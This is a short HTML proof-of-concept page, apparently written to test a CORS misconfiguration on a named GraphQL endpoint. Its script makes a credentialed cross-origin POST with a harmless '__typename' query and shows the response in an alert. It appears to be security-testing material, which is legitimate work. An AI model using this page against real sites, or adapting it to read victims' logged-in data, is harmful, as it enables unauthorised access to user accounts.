<!DOCTYPE html>
<html>
    <body>
        <h3>CORS PoC</h3>

        <script>
            fetch("https://breakme.getincentify.com/graphql?AccountQuery", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    query: "{ __typename }" // dummy safe GraphQL query
                }),
                credentials: "include"
            })
                .then(async response => {
                    const text = await response.text();
                    alert("Status: " + response.status + "\n\nResponse:\n" + text);
                })
                .catch(err => {
                    alert("Error: " + err);
                });
        </script>

    </body>
</html>
